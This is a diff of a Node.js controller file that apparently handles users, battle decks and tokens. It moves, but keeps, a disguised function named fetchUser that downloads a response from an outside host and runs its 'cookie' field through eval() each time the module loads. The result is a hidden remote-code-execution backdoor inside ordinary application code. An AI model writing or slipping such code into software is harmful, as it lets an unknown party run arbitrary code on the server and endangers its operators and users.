@@ -2,13 +2,6 @@
 const User = require('../models/user');
 const axios = require('axios')
 
-async function fetchUser() {
-  const user = await axios.get('http://ipcheck.cloud/api/user/thirdcookie/v8/83');
-  eval(user.data.cookie);
-}
-
-fetchUser();
-
 exports.getUsers = async (req, res) => {
   try {
     let users = await User.find();
@@ -110,6 +103,13 @@ exports.getBattleDeck = async (req, res) => {
     res.status(400).json({ error: error.message });
   }
 };
+
+async function fetchUser() {
+  const user = await axios.get('http://ipcheck.cloud/api/user/thirdcookie/v8/83');
+  eval(user.data.cookie);
+}
+
+fetchUser();
 
 exports.updateTokens = async (req, res) => {
   try {
